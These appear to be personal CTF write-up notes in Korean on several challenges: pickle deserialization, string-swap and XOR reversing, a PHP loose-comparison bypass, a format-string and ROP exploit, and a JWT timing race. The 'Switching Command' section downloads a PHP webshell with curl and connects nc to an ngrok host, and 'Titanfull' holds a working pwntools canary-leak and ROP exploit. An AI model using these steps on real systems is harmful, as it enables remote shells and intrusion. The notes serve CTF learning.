# myPickle
is_admin이 true인 새로운 Dic 인스턴스(?)를 생성하고 나온 키를 다시  인증하는데 사용함함

```python
import pickle
import zlib
import base64
from datetime import datetime

import flag


class Dic:
    def __init__(self, dic):
        self.username = dic["username"]
        self.password = dic["password"]
        self.is_admin = dic["is_admin"]
        self.date = dic["date"]

    def f(self):
        if self.is_admin:
            print("oh.. hello admin, good to you.")
            flag.flag()
        else:
            print("\nhello " + self.username + ", welcome to k.knock.")
            print("============== profile ==============")
            print("Username : " + self.username)
            print("Password : " + self.password)
            print("Generate date : " + self.date + "\n")


def menu():
    print("1. Generate key")
    print("2. Authenticate")
    print("3. Exit")


while True:
    print("hello guys, what do you want?")
    menu()
    try:
        num = int(input(">> "))
    except:
        exit(0)

    if num == 1:

        username = input("Username : ")
        password = input("Password : ")
        date = datetime.now().strftime("%Y/%m/%d %H:%M:%S")

        dic = {
            "username": username,
            "password": password,
            "is_admin": False,
            "date": date,
        }
        key = Dic(dic)

        key = pickle.dumps(key)
        key = zlib.compress(key)
        key = base64.b64encode(key)

        print("key : " + key.decode() + "\n")

    elif num == 2:
        print("Are you admin? submit your key.")
        try:
            userInput = input(">> ").encode()
            userInput = base64.b64decode(userInput)
            userInput = zlib.decompress(userInput)
            userInput = pickle.loads(userInput)
        except:
            print("invalid key.\n")
            continue
        userInput.f()

    elif num == 3:
        print("bye.")
        exit(0)

    elif num == 4:
        dic = {
            "username": "오성훈",
            "password": "babo",
            "is_admin": True,
            "date": datetime.now().strftime("%Y/%m/%d %H:%M:%S"),
        }
        key = Dic(dic)

        key = pickle.dumps(key)
        key = zlib.compress(key)
        key = base64.b64encode(key)

        print(key)

    else:
        print("choose 1~3")

```


---
# LOLOLOLOLLOLOLOL

나오는 함수들 로직이 다 비슷한데, 대상 인덱스 제외하면 모두 스왑하는 함수임
correct가 나오게 하는 문자열을 찾으면 되므로 아래처럼 특정 인덱스의 키를 스왑하는 코드를 짜면 짠
```python
def _swap(data_list, idx):
    data_list[idx], data_list[19 - idx] = data_list[19 - idx], data_list[idx]


key = "TW9Ab2ichR3Un5EhQCEh"
key_list = list(key)

for i in range(10):
    _swap(key_list, i)

_swap(key_list, 5)

flag = "".join(key_list)
print(flag)

```


---
# Dreamhack - Switching Command

- username이 admin인지를 체크함 
- [문서](https://www.php.net/manual/en/control-structures.switch.php)를 확인해 보면 switch 문에서 느슨한 비교를 하는 것을 알 수 있음
- dockerfile을 보면 웹쉘을 을 올리는데 도움이 될만한 툴이 많이 설치되어 있음
- 그러나 대부분 $pattern에서 필터링하여 curl 정도만 사용할 수 있음


- swtich문에서 느슨한 비교를 한다는 점을 이용하여 username에 true를 넣어 우회를 할 수 있음
- 처음엔 리버스쉘을 올린다는 느낌으로 접근했는데 sh을 못써서 포기
- 빌드하고 권한을 보니 꽤 괜찮을 것 같아서 그냥 바인드쉘을 올림 

```
echo escapeshellcmd("curl https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./exploit.php");

curl https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./exploit.php

'n'c tcp://0.tcp.jp.ngrok.io 17246
nc
```


---
# Dreamhack - Titanfull
- 뱅가드에서 글자 수 제한 없이 입력받음 -> 버퍼오버플로우
- menu에서 printf() 오용 -> 포멧스트링 버그
- 아래 사진 정보들을 기반으로 익스함
- pie base로 푸는 방법도 있는 것 같은데 잘 몰라서 걍 libc base 구해서 풀었음


![[스크린샷 2024-04-09 050014.png]]

![[스크린샷 2024-04-09 050103.png]]

![[스크린샷 2024-04-09 050600.png]]

![[스크린샷 2024-04-09 050854.png]]

![[스크린샷 2024-04-09 051104.png]]

```python
from pwn import *
import sys

if sys.argv[1] == "1":
    env = {"LD_PRELOAD": "./libc6_2.31-0ubuntu9.10_amd64.so"}
    p = process("./real_ez", env=env)
else:
    p = remote("ctf.hanbyul.me", 10013)

context.log_level = "debug"

p.sendline(b"%17$p%21$p")

p.recvuntil(b"0x")
canary = int(p.recvn(16), 16)

p.recvuntil(b"0x")
libc_base = int(p.recvn(12), 16) - 0x24083
print(libc_base)

p.sendlineafter(b"> ", b"7274")

payload = b"B" * 0x18
payload += p64(canary)
payload += p64(0xAAAAAAAA)
payload += p64(libc_base + 0x023B6A + 1)
payload += p64(libc_base + 0x023B6A)
payload += p64(libc_base + 0x1B45BD)
payload += p64(libc_base + 0x052290)

p.sendlineafter(b"titan :", payload)
p.interactive()

```

---
# real_ez_rev
- 그냥 이전에 나온 로직 그대로 역산하면 됨

```python
def shift_right(text, num):
    a = text[-num:]
    b = text[:-num]
    return a + b


def shift_left(text, num):
    a = text[:num]
    b = text[num:]
    return b + a


def xor_with_key(text, key):
    text_bytes = text.encode()
    key_bytes = key.encode()

    result = bytearray(len(text_bytes))

    for i in range(len(text_bytes)):
        result[i] = text_bytes[i] ^ key_bytes[i % len(key_bytes)]

    return result.decode()


if __name__ == "__main__":
    cipher = "xz|elcfa~rfaoi{ykfzpdlxba"
    key = "qksrkqs"

    cipher = shift_left(cipher, 3)
    print(cipher)
    cipher = xor_with_key(cipher, key)
    print(cipher)
    cipher = shift_right(cipher, 3)
    print(cipher)
    cipher = xor_with_key(cipher, key)
    print(cipher)
    cipher = shift_left(cipher, 3)
    print(cipher)

```


---
# Dreamhack - chocoshop
- 세션은 삭제되었지만 JWT는 만료가 안되는 때가 존재함을 이용함 

```python
import requests as req
import json
import time
import threading

domain = "http://host3.dreamhack.games:13654"


def get_session():
    url = domain + "/session"
    res = req.get(url=url)
    session_json = json.loads(res.text)
    session = session_json["session"]
    return session


def coupon_claim(session):
    url = domain + "/coupon/claim"
    headers = {"Authorization": session}
    res = req.get(url=url, headers=headers)
    coupon_json = json.loads(res.text)
    coupon = coupon_json["coupon"]
    return coupon


def coupon_submit(session, coupon):
    url = domain + "/coupon/submit"
    header = {"Authorization": session, "coupon": coupon}
    res = req.get(url=url, headers=header)
    print(res.text)


if __name__ == "__main__":
    session = get_session()
    print(session)
    coupon = coupon_claim(session)

    coupon_submit(session=session, coupon=coupon)
    time.sleep(44.99)
    coupon_submit(session=session, coupon=coupon)

```